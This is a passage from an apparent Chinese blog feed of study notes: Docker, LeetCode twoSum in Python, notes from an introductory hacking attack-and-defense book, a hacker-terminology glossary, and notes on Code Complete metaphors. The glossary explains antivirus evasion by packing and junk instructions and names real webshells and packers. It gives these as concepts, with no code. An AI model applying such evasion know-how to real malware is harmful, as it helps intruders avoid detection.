title="容器技术与Docker（Docker在容器技术中的位置）"></a>容器技术与Docker（Docker在容器技术中的位置）</h1><p>容器成就了Docker，而Docker也极大地促进了容器技术的发展。<br>关于容器是否是Docker的核心技术在业内一直存在争议。Docker的核心是对分层镜像的创新使用，还是统一了应用的打包分发和部署方式。<br>因为Docker的创新不一定要依赖容器技术，像基于传统的hypervisor也可以做到。<br>官方对Docker核心技术功能的描述“Build，Ship and Run”中也确实没有体现与容器相关的内容。<br>实际上，从Docker公司的表现来看，它不会单纯地只是做一个CaaS（容器即服务）服务商。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《Docker从入门到实战》，黄婧钧，2017</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>twoSum</title>
      <link href="/cs/leetcode/twoSum/"/>
      <url>/cs/leetcode/twoSum/</url>
      
        <content type="html"><![CDATA[<p>integer、indices、input、assume、类的方法传参、enumerate、random(5)<br><a id="more"></a><br>Given an array of <code>integers</code>, return <code>indices</code> of the two numbers such that they add up to a specific target.<br><code>You may assume that each input would have exactly one solution, and you may not use the same element twice.</code></p><h1 id="1-enumerate"><a href="#1-enumerate" class="headerlink" title="1. enumerate"></a>1. enumerate</h1><p><a href="http://www.runoob.com/python/python-func-enumerate.html" target="_blank" rel="noopener">http://www.runoob.com/python/python-func-enumerate.html</a><br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">seq = [<span class="string">'one'</span>, <span class="string">'two'</span>, <span class="string">'three'</span>]</span><br><span class="line">seq_enumerated=enumerate(seq) </span><br><span class="line"><span class="comment">#组合为一个索引序列，同时列出数据和数据下标</span></span><br><span class="line">print(seq_enumerated) </span><br><span class="line"><span class="comment">#&lt;enumerate object at 0x0000021026476828&gt; 返回枚举对象</span></span><br><span class="line">print(type(seq_enumerated)) </span><br><span class="line"><span class="comment">#&lt;class 'enumerate'&gt; </span></span><br><span class="line"><span class="comment">#print(seq_enumerated[0])    #TypeError  'enumerate' object is not subscriptable</span></span><br><span class="line"><span class="keyword">for</span> i, element <span class="keyword">in</span> enumerate(seq):</span><br><span class="line">    print(i,element)</span><br></pre></td></tr></table></figure></p><h1 id="2-参考"><a href="#2-参考" class="headerlink" title="2. 参考"></a>2. 参考</h1><h2 id="2-1-O-n2-1"><a href="#2-1-O-n2-1" class="headerlink" title="2.1. O(n2)-1"></a>2.1. O(n<sub>2</sub>)-1</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        d = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">            m = target - n</span><br><span class="line">            <span class="keyword">if</span> m <span class="keyword">in</span> d:</span><br><span class="line">                <span class="keyword">return</span> [d[m], i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                d[n] = i</span><br><span class="line">a=Solution()</span><br><span class="line">m=a.twoSum([<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>],<span class="number">9</span>)</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure><h3 id="2-1-1-去掉class"><a href="#2-1-1-去掉class" class="headerlink" title="2.1.1. 去掉class"></a>2.1.1. 去掉class</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(nums, target)</span>:</span></span><br><span class="line">    d = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i, n <span class="keyword">in</span> enumerate(nums):</span><br><span class="line">        m = target - n</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">in</span> d:</span><br><span class="line">            <span class="keyword">return</span> [d[m], i]</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            d[n] = i</span><br><span class="line">print(twoSum([<span class="number">2</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">15</span>],<span class="number">9</span>))</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span><span class="params">(self, nums, target)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(nums) &lt;= <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        buff_dict = &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(nums)):</span><br><span class="line">            <span class="keyword">if</span> nums[i] <span class="keyword">in</span> buff_dict:</span><br><span class="line">                <span class="keyword">return</span> [buff_dict[nums[i]], i]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                buff_dict[target - nums[i]] = i</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> leetcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客攻防</title>
      <link href="/cs/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2/"/>
      <url>/cs/%E9%BB%91%E5%AE%A2%E6%94%BB%E9%98%B2/</url>
      
        <content type="html"><![CDATA[<p>2018年12月31日，9787115479563，新阅文化，黑客攻防从入门到精通。<br>热心于、高超、智慧结晶、成就了、英雄、主角、令人畏惧的存在、如入无人之境。无法估量的、致命的。<br>互联网、UNIX、Linux。互联网、个人计算机、自由软件。<br>计算机系统：<br>1946年在宾夕法尼亚大学、麻省理工学院、贝尔实验室、1999年。高级技术人员、乔布斯。COMPUTER FOREVERY PEOPLE!大公司、国家政府→个人PC<br>网络黑客、网络骇客及网络朋客。窃听、入侵、泄露信息。电话、计算机、云服务器、家具设备、智能终端、测试数据、WiFi、智能机器人。<br>维基百科：<a href="https://zh.wikipedia.org/wiki/黑客" target="_blank" rel="noopener">黑客</a> <a href="https://zh.wikipedia.org/wiki/贝尔实验室" target="_blank" rel="noopener">贝尔实验室</a><br><a id="more"></a></p><h1 id="第一章-黑客的面纱"><a href="#第一章-黑客的面纱" class="headerlink" title="第一章 黑客的面纱"></a>第一章 黑客的面纱</h1><p>在计算机网络世界里，黑客曾一度成为一种荣耀，它代表着反权威却奉公守法的网络英雄，然而现如今黑客已成为网络安全最大威胁的因素。</p><h2 id="1-1-认识黑客"><a href="#1-1-认识黑客" class="headerlink" title="1.1  认识黑客"></a>1.1  认识黑客</h2><p>黑客一词，源于英文Hacker，原指热心于计算机技术，水平高超的计算机专家，尤其是程序设计人员。互联网、UNIX、Linux都是黑客智慧的结晶。有人说：是黑客成就了互联网，成就了个人计算机，成就了自由软件，黑客是计算机和互联网革命真正的英雄和主角。但到了今天，黑客一词已被用于泛指那些专门利用计算机搞破坏或恶作剧的“家伙”。对这些人的正确英文叫法是Cracker，有人翻译成“骇客”。</p><h3 id="1-1-1-黑客的过去、现在与未来"><a href="#1-1-1-黑客的过去、现在与未来" class="headerlink" title="1.1.1  黑客的过去、现在与未来"></a>1.1.1  黑客的过去、现在与未来</h3><p>所谓的黑客最早始于20世纪50年代，最早的计算机于1946年在宾夕法尼亚大学出现，而最早的黑客出现于麻省理工学院，包括贝尔实验室都有，最初的活动参与者一般都是一些高级的技术人员，“越南战争”包括苹果公司的创始人乔布斯。当时他们提出一个口号，计算机为人民所用，COMPUTER FOREVERY PEOPLE！为什么这样说呢？因为那时大部分计算机都是大型计算机，只有大型公司、国家政府才有可能用得起。他们觉得计算机作为未来的一种重要的工具，应该为每一个人每一个家庭所用，所以提出了这样的口号。在这样的大环境和文化背景下，才出现了个人PC。<br>在国内，从1999年开始，黑客这个词才开始频繁地出现在国内的媒体上。<br>在给黑客下定义时，已经把黑客看成是一群人，他们具有几个特征，年轻化、男性化。一种类型是传统型的黑客，就像前面所定义的那样，他们进入别人的计算机系统后并不会进行破坏性的行为，而是告诉你的密码不安全，不会破坏你的信息，原有的东西都会保留而不会改动；另一种类型是，他们发现你的安全漏洞，并且利用这些漏洞破坏你的网站，让你出洋相，这些人就成了骇客，即Cracker，总之，只要是带有破坏性目的或有恶意的人，如果掌握你的信息后，向你要钱，如果不给他钱，就要把那些信息公布出来，这都是骇客；还有一种类型是被很多国人称作朋客的人，即恶作剧者，他们未必具有很高的技术，但有老顽童周伯通的心理，老是喜欢跟你开玩笑，通常用一些简单的攻击手段去搞一搞BBS、聊天室之类的。所以，我们把这些人分为传统的网络黑客、网络骇客及网络朋客。<br>黑客的手段一直以来都是令人畏惧的存在。他们可以窃听电话、入侵计算机，在各种网站如入无人之境。在云时代，由于更多的企业选择将数据上传至云端，采用公有云进行业务处理的企业也越来越多，黑客的存在成为云服务提供商最为头疼的安全问题之一。<br>物联网时代下，黑客可选择的攻击手段变得更多，用户的家居设备、企业的智能终端、探测仪器、测试数据甚至连WiFi都可能成为黑客入侵的项目。黑客一旦入侵导致信息泄露，可能造成的损失将会是无法估量的。<br>在人工智能方面，黑客入侵的结果将会是更为致命的。以目前的科技发展来看，黑客入侵机器人所在系统已经只是时间问题，而其所产生的后果无论如何都是无法接受的。相对而言，黑客入侵都只是图财，很少有为了害命的。<br>1.1.3  常见的黑客攻击目标<br>黑客攻击目标是网络资源，黑客的攻击手段和攻击目标息息相关，网络资源主要包括信息资源、硬件资源和链路带宽。<br>一、信息资源<br>信息资源包括存储在主机系统中的信息、传输过程中的信息和转发结点正常工作需要的控制信息，如存储在主机系统中的文本文件、数据库和可执行程序等，路由器的路由表、访问控制列表、交换机的转发表等。黑客对于信息资源的攻击有两类：一类是窃取网络中的信息，如用户私密信息（账户和口令）、企业技术资料，甚至有关国家安全的机密信息，为了不引起信息拥有者的警惕，黑客会尽量隐蔽攻击过程，消除窃取信息过程中留下的操作痕迹，这一类攻击一般不会破坏信息，以免引起用户警惕；另一类是破坏网络信息，篡改传输过程中的信息，篡改主机系统中的文件、数据库中的记录及路由表中的路由项等，这一类攻击以破坏信息、瘫痪主机系统和转发结点为目的。随着信息成为重要的战略资源，以信息为目标的攻击成为最常见的黑客攻击。<br>二、硬件资源<br>硬件资源包括主机硬件资源和转发结点硬件资源。主机硬件资源有CPU、存储器、硬盘及外设等。转发结点硬件资源有处理器、缓冲器、交换结构等。黑客对于硬件资源的攻击主要表现为过度占用硬件资源，以至于没有提供正常服务所需要的硬件资源，大量地拒绝服务攻击就是针对硬件资源的攻击。例如，SYN泛洪攻击就是通过大量占用主机系统分配给TCP进程的存储器资源，使TCP进程没有存储器资源用于响应正常的TCP连接请求。有的DoS攻击发送大量无用IP分组给路由器，以此占用路由器内部处理器和交换结构资源，使路由器丧失转发正常IP分组所需要的处理能力、缓冲能力和交换能力。<br>三、链路带宽<br>链路带宽指信道的通信容量，如l00Mbit/s的以太网链路，表示每秒最多传输l00Mbit二进制数码，黑客通过大量占用信道通信容量使链路丧失传输正常信息流的能力。</p><p>1.3  进程与端口基础<br>端口是计算机提供服务的大门，黑客要想入侵计算机，就需要从这扇门里进入。<br>进程是系统或应用程序的一次动态执行，是计算机系统的动态核心。<br>了解进程与端口的基础知识及相关操作可以为黑客防范打下基础。<br>1.3.1  认识进程<br>进程（Process）是计算机中的程序关于某数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位，是操作系统结构的基础。进程就好比工厂的车间，它代表CPU所能处理的单个任务。任一时刻，CPU总是运行一个进程，其他进程处于非运行状态。<br>进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的（静态的），进程是活的（动态的）。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；用户进程就是所有由用户启动的进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。<br>危害较大的可执行病毒同样以“进程”形式出现在系统内部（一些病毒可能并不被进程列表显示，如“宏病毒”），那么及时查看并准确杀掉非法进程对于手工杀毒起着关键性的作用。<br>1.3.2  进程基础操作<br>计算机启动后，在计算机系统中启动任意程序，系统都会在后台加载相应的进程，对于进程的相关操作介绍如下。<br>一、查看系统进程<br>在计算机正常运行时，系统进程主要包括系统管理计算机本身和完成各种操作所必需的程序与用户开启、执行的软件程序。我们可以通过Windows任务管理器对系统中运行的进程进行查看。<br>在Windows系统下，鼠标右键单击“任务栏”空白处，选择“启动任务管理器”命令，或者按“Ctrl”+“Shift”+“Esc”组合键，即可打开“Windows任务管理器”窗口，如图1-5所示。如果想看任务管理器显示的列内容，需单击“任务管理器”上方的“查看”选项，然后单击“选择列”选项，弹出“选择进程页列”对话<br>在Windows系统中，用户关闭进程可以进行如下操作。<br>1．鼠标右键单击“任务栏”空白处，选择“启动任务管理器”命令，或者按“Ctrl”+“Shift”+“Esc”组合键，即可打开“Windows任务管理器”窗口。<br>2．选择要结束的系统进程，单击“结束进程”按钮，如图1-7所示。在弹出的对话框中单击“结束进程”按钮即可完成结束进程操作，如图1-8所示。<br>1.3.3  端口概述<br>“端口”是英文port的意译，可以认为是设备与外界进行通信交流的出口。端口可分为虚拟端口和物理端口，其中虚拟端口指计算机内部或交换机路由器内的端口，不可见，如计算机中的80端口、21端口、23端口等；物理端口又称为接口，是可见端口，如计算机背板的RJ45网口，交换机路由器集线器等的RJ45端口。电话使用的RJ11插口也属于物理端口的范畴。<br>1.3.4  查看端口<br>在Windows系统中，我们可以用Netstat命令查看端口。在“命令提示符”窗口中，运行“netstat -a -n”命令即可看到以数字形式显示的TCP和UDP连接的端口号及其状态，具体操作步骤如下。<br>1．单击“开始”菜单，选择“运行”命令，或者按“Win”+“R”组合键弹出运行对话框。<br>2．在文本框里输入“cmd”命令，单击“确定”按钮，如图1-9所示。<br>3．打开命令提示符窗口，输入“netstat -a -n”命令查看TCP和UDP连接的端口号及其状态，如图1-10所示。<br>图1-9  运行cmd命令<br>图1-10  查看端口<br>一些端口常常会被黑客利用，还会被一些木马病毒利用，对计算机系统进行攻击，在未来的学习中，我们将逐渐介绍如何应对此类入侵。</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>随着网络技术的飞速发展，网络已经成为个人生活与工作中获取信息的重要途径，但是随着网络带给人们生活便捷的同时，木马病毒肆虐、电信诈骗猖獗等网络安全问题也给我们的个人信息及财产安全带来严重威胁。于是，构建一个良好的网络环境，对于病毒和系统漏洞做好安全防范，及时查杀病毒和修复漏洞就显得尤为重要。为了避免计算机网络遭遇恶意软件、病毒和黑客的攻击，就必须做好计算机网络安全维护和防范。</p><h2 id="本书内容"><a href="#本书内容" class="headerlink" title="本书内容"></a>本书内容</h2><p>本书主要介绍和分析与黑客攻防相关的基础知识。全书由浅入深地分析了黑客攻防有关的原理和防御手段，一共可分为四部分：第一部分主要讲述黑客入门基础与相关网络知识，第二部分主要讲述PC端系统及应用的安全攻防，第三部分主要讲述时下智能手机移动端的安全攻防，第四部分主要介绍社会工程学知识。<br>本书内容新颖，涵盖了时下热门的勒索病毒、WiFi安全、网络谣言和电信诈骗等问题的应对方法。此外，本书还从黑客入侵防护应用角度给出了相对独立的论述，使读者可对如何建构一个实用的入侵防范体系有一个基本概念和思路。</p><h2 id="本书特色"><a href="#本书特色" class="headerlink" title="本书特色"></a>本书特色</h2><p>每章都以实例出发，讲解全面，轻松入门，快速打通初学者学习的重要关卡。<br>真正以图来解释每一步操作过程，通俗易懂，阅读轻松。<br>学习目的性、指向性强，黑客新技术盘点，让读者实现“先下手为强”。</p><h2 id="读者对象"><a href="#读者对象" class="headerlink" title="读者对象"></a>读者对象</h2><p>本书作为一本面向广大网络安全人员的速查手册，适合以下读者学习使用：<br>（1）网络安全及黑客技术初学者、爱好者；<br>（2）需要获取数据保护的日常办公人员；<br>（3）网吧工作人员、企业网络管理人员；<br>（4）喜欢研究黑客技术的网友；<br>（5）相关专业的学生；<br>（6）培训班学员。<br>本书由李阳、田其壮和张明真等人编著，书中若有疏漏和不足之处敬请广大读者批评指正，也期待读者能从本书中得到有价值的收获！<br>最后，提醒广大读者：根据国家有关法律法规，任何利用黑客技术攻击他人的行为都属于违法行为，广大读者在阅读本书后不要使用书中介绍的黑客技术试图对网络进行攻击，否则后果自负，切记勿忘。<br>编者<br>2018年1月</p><h2 id="扫码视频"><a href="#扫码视频" class="headerlink" title="扫码视频"></a>扫码视频</h2><p>ASPack介绍<br>DOS命令介绍<br>EXE捆绑机介绍<br>IP地址配置介绍<br>Nmap介绍<br>SRSniffer介绍<br>Windows防火墙介绍<br>Windows密码设置介绍<br>查杀木马病毒介绍<br>关闭远程注册表服务介绍<br>进程端口操作介绍<br>禁止使用注册表编辑器介绍<br>局域网共享设置介绍<br>浏览器安全设置介绍<br>清除日志文件介绍<br>文件恢复介绍<br>远程连接介绍<br>远程连接介绍</p>]]></content>
      
      
      
        <tags>
            
            <tag> 黑客攻防 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础术语</title>
      <link href="/cs/%E9%BB%91%E5%AE%A2%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/"/>
      <url>/cs/%E9%BB%91%E5%AE%A2%E5%9F%BA%E7%A1%80%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<p>肉鸡、木马、网页木马、挂马、后门、rootkit、IPC$、弱口令、默认共享、Shell、Webshell、溢出、注入、注入点、内网、外网、端口、免杀、加壳、花指令<br><a id="more"></a><br>网络安全中常会遇见肉鸡、后门之类的黑客词语，这些词语并非原本的含义而是由原本含义引申出的其他含义。常用术语及含义解释如下。</p><h2 id="肉鸡"><a href="#肉鸡" class="headerlink" title="肉鸡"></a>肉鸡</h2><p>所谓“肉鸡”是一种很形象的比喻，比喻那些可以随意被我们控制的计算机，对方可以是Windows系统，也可以是UNIX/Linux系统，可以是普通的个人计算机，也可以是大型的服务器，我们可以像操作自己的计算机那样来操作它们，而不被对方所发觉。</p><h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><p>木马就是那些表面上伪装成了正常的程序，但是当这些程序被运行时，就会获取系统的整个控制权限。有很多黑客就是热衷于使用木马程序来控制别人的计算机，比如灰鸽子、黑洞、PcShare等。</p><h2 id="网页木马"><a href="#网页木马" class="headerlink" title="网页木马"></a>网页木马</h2><p>网页木马是表面上伪装成普通的网页文件或是将恶意的代码直接插入到正常的网页文件中，当有人访问时，网页木马就会利用对方系统或浏览器的漏洞自动将配置好的木马的服务端下载到访问者的计算机上来自动执行。</p><h2 id="挂马"><a href="#挂马" class="headerlink" title="挂马"></a>挂马</h2><p>挂马就是在别人的网站文件里面放入网页木马或是将代码嵌入到对方正常的网页文件里，以使浏览者中马。</p><h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><p>后门是一种形象的比喻，入侵者在利用某些方法成功地控制了目标主机后，可以在对方的系统中植入特定的程序，或者是修改某些设置。这些改动表面上是很难被察觉的，但是入侵者却可以使用相应的程序或方法来轻易地与这台计算机建立连接，重新控制这台计算机，就好像是入侵者偷偷地配了一把主人房间的钥匙，可以随时进出而不被主人发现一样。</p><h2 id="rootkit"><a href="#rootkit" class="headerlink" title="rootkit"></a>rootkit</h2><p>rootkit是攻击者用来隐藏自己的行踪和保留Root（根权限，可以理解成Windows下的System或管理员权限）访问权限的工具。通常，攻击者通过远程攻击的方式获得Root访问权限，或者是先使用密码猜解（破解）的方式获得对系统的普通访问权限，进入系统后，再通过对方系统内存在的安全漏洞获得系统的Root权限。然后，攻击者就会在对方的系统中安装Rootkit，以达到自己长久控制对方的目的。Rootkit与我们前边提到的木马和后门很类似，但远比它们要隐蔽，黑客守卫者就是很典型的Rootkit，还有国内的Ntroorkit等。</p><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC$"></a>IPC$</h2><p>IPC$是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限，在远程管理计算机和查看计算机的共享资源时使用。</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>弱口令指那些强度不够，容易被猜解的，类似123、abc这样的口令（密码）。</p><h2 id="默认共享"><a href="#默认共享" class="headerlink" title="默认共享"></a>默认共享</h2><p>默认共享是Windows XP/2000/2003系统开启共享服务时自动开启所有硬盘的共享，因为加了“$”符号，所以看不到共享的“托手”图标，也称为隐藏共享。</p><h2 id="Shell"><a href="#Shell" class="headerlink" title="Shell"></a>Shell</h2><p>Shell指的是一种命令执行环境，如我们按键盘上的“Win”+“R”组合键时出现“运行”对话框，在里面输入“cmd”会出现一个用于执行命令的黑窗口，这就是Windows的Shell执行环境。通常我们使用远程溢出程序成功溢出远程计算机后得到的那个用于执行系统命令的环境就是对方的Shell。</p><h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><p>Webshell就是以ASP、PHP、JSP或CGI等网页文件形式存在的一种命令执行环境，也可以将其称作是一种网页后门。黑客在攻击了一个网站后，通常会将这些ASP或PHP后门文件与网站服务器WEB目录下正常的网页文件混在一起，以后就可以使用浏览器来访问这些ASP或PHP后门，得到一个命令执行环境，以达到控制网站服务器的目的，可以上传/下载文件、查看数据库、执行任意程序命令等。国内常用的Webshell有海阳ASP木马、Phpspy、c99shell等。</p><h2 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h2><p>确切地讲，应该是“缓冲区溢出”。简单的解释就是程序对接收的输入数据没有执行有效的检测而导致错误，后果可能是造成程序崩溃或是执行攻击者的命令。大致可以分为两类：堆溢出和栈溢出。</p><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>随着B/S模式应用开发的发展，使用这种模式编写程序的程序员越来越多，但是由于程序员的水平参差不齐，相当大一部分应用程序存在安全隐患。用户可以提交一段数据库查询代码，根据程序返回的结果，获得某些他想要知道的数据，这就是所谓的SQLinjection，即SQL注入。</p><h2 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h2><p>注入点是可以实行注入的地方，通常是一个访问数据库的连接。根据注入点数据库的运行账号的权限不同，所得到的权限也不同。</p><h2 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h2><p>内网通俗地讲就是局域网，如网吧、校园网和公司内部网等都属于此类。查看IP地址如果是在以下3个范围之内，就说明我们是处于内网之中的：10.0.0.0～10.255.255.255，172.16.0.0～172.31.255.255，192.168.0.0～192.168.255.255。</p><h2 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h2><p>外网，也叫互联网。从范围上来讲，是指全球性的互联网络。如在中国用计算机上网，连接访问美国的微软官网，就需要通过外网连接才能访问。外网IP地址是可以进行全球连接的。</p><h2 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h2><p>端口相当于一种数据的传输通道。用于接受某些数据，然后传输给相应的服务，而计算机将这些数据处理后，再将相应的恢复通过开启的端口传给对方。一般每一个端口的开放都对应了相应的服务，要关闭这些端口只需将对应的服务关闭就可以了。</p><h2 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h2><p>免杀就是通过加壳、加密、修改特征码和加花指令等技术来修改程序，使其逃过杀毒软件的查杀。</p><h2 id="加壳"><a href="#加壳" class="headerlink" title="加壳"></a>加壳</h2><p>加壳就是利用特殊的算法，将EXE可执行程序或DLL动态链接库文件的编码进行改变（如实现压缩、加密），以达到缩小文件体积或加密程序编码，甚至是躲过杀毒软件查杀的目的。目前较常用的壳有UPX、ASPack、PePack、PECompact、UPack、免疫007、木马彩衣等。</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>花指令就是几句汇编指令，让汇编语句进行一些跳转，使得杀毒软件不能正常地判断病毒文件的构造。说通俗点就是“杀毒软件是从头到脚按顺序来查找病毒，如果我们把病毒的头和脚颠倒位置，杀毒软件就找不到病毒了”。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 黑客攻防 </tag>
            
            <tag> fix </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐喻</title>
      <link href="/cs/%E9%9A%90%E5%96%BB/"/>
      <url>/cs/%E9%9A%90%E5%96%BB/</url>
      
        <content type="html"><![CDATA[<p>代码大全之隐喻<br><a id="more"></a></p><h1 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h1><p>隐喻是启示而不是算法。因此它们往往有一点随意( sloopy)。<br>隐喻把软件开发过程与其他你熟系的活动联系在一起,帮助你更好地理解。<br>仔细的准备是必要的。<br>而大型项目和小型项目之间也是有差异的。<br>通过把软件开发中的实践比作是智慧工具箱中的工具。<br>每位程序员都有许多工具,但并不存在任何一个能适用于所有工作的工具,因地制宜地选择正确工具是成为能有效编程的程序员的关键。</p><h1 id="建筑引申"><a href="#建筑引申" class="headerlink" title="建筑引申"></a>建筑引申</h1><p>软件架构(建筑学, architecture)、<br>支撑性测试代码(脚手架,scaffolding)、<br>构建(建设, constructon)、<br>基础类( foundation classes)<br>分离代码( tearing code apart)。<br>你可能还听说过更多这一类的词语。</p><h1 id="同名"><a href="#同名" class="headerlink" title="同名"></a>同名</h1><p>方法技术技巧诀窍</p><h1 id="过程隐喻"><a href="#过程隐喻" class="headerlink" title="过程隐喻"></a>过程隐喻</h1><p>隐喻、类比、模型、概念化、泛型<br>启发式、探索式<br>完整、充分<br>可读性<br>春天播种了一个代码种子，希望秋天收获丰盛的代码<br>播种、耕作、小步前进<br>生长、累积、冲积层、珍珠、提炼<br>growing、accretion、incremental、iterative、adaptive、evolutionary<br>培育、生长、增量、迭代、自适应、演进<br>writing、building<br>增量式开发：<br>先做出一个简单可行版本。一次增加一小部分代码，直到得到一个完全可以工作的系统<br>principle不仅指原则，还指原理。<br>演进式交付( Evolutionary Delivery)<br>敏捷编程( agile programming)</p><p>计划、准备及执行、设计与重构<br>定义、设计、编码、优化、评审、审查<br>省时省力<br>容器类( containerclasses)、科学计算函数、用户界面组件、数据库访问组件<br>调用别人的库，如砖块。自己编写那些现成的代码通常是没有意义的<br>自己编写库，如自己定制的高档家具<br>速度和精读的提升<br>成果<br>适当的多层次规划对编程是有好处的。<br>精心计划不意味事无巨细的计划或过度计划<br>在后期改变细节的能力。改变不会出重大事故。安全、时间成本和物资成本<br>核查。留有余地以保证安全。<br>对结构进行超出常规的规划和建设（over-engineered）<br>超大型的项目要更高级别的规划<br>这就是开发经验啦<br>Capers Jones发表的报告称,一套100万行代码的软件系统,平均需要69种文档(1998)。<br>其需求规格文档一般有四五千页长,而设计文档常常是需求的两三倍长。<br>不太可能有哪个人能完全理解这种规模的项目的所有设计细节——甚至只是通读一遍都不那么容易。因此,更充分的准备工作也就理所应当了。<br>有没有更好的工具</p><p>启发、受益</p><p>灵活轻量级的开发方法<br>严格重量级的开发方法</p><h1 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h1><p>另一个关于软件方面的耕作的比喻,<br>RethinkingSystems Analysisnd Design<br>Weinberg 1988<br>On the Originsof Designer Intuition(论设计直觉的源泉) 这一章</p><p>深入阅读关于“构建隐喻”的引申,请见“是什么撑起了天花板What Supportsthe Roof)”一文(Starr 2003)</p><p>在关于隐喻、模型( model)以及范型( paradigm)方面的众多书籍中, THomasKuhn写的那本是试金石。<br>Kuhn, THomas S.《科学变革的结构》(第三版)( The Structure of ScientificRevolutions, 3d ed. Chicago, IL: The University of Chicago Press, 1996.). Kuhn *-在一个达尔文周期中,科学理论如何相对于其他理论而诞生、发展并消亡的书,于1962年首次发布,奠定了科学哲学的基础。<br>该书短小精悍,列举了大量科学中隐喻、模型以及范型间此消彼长的有趣示例。</p><p>Floyd, Robert w.“编程范型”(“ The Paradigms of Programming.”1978年图灵奖的颁奖演讲)<br>《 Communications of the ACM》(《ACM通讯》), August1979,pp.455—460.<br>这是一篇令人神往的关于软件开发中的模型的讨论, Floyd将Kuhn的理念用到了编程上。</p><p>#</p><p>好的工匠知道完成某项工作要用哪样工具,也知道该怎样正确地使用。<br>编程方面的知识学得越多,你脑中的工具箱中就会有更多的分析工具,也会知道该在何时用这些工具,以及怎样正确地使用它们。<br>在软件领域里,专业的咨询人员有时会让你专用某种软件开发方法而远离其他方法。这样并不妥当,因为当你百分之百地依赖于某一方法论时,你就只会用一种方法去看世界了。<br>某些情况下,对于你所面临的问题还有其他更好的方法,你可能错失良机。这种“工具箱隐喻”能够帮助你把所有的方法、技术以及技巧留在脑海中—合适的时候即可拿来就用</p>]]></content>
      
      
      
        <tags>
            
            <tag> wiki </tag>
            
            <tag> 思考 </tag>
            
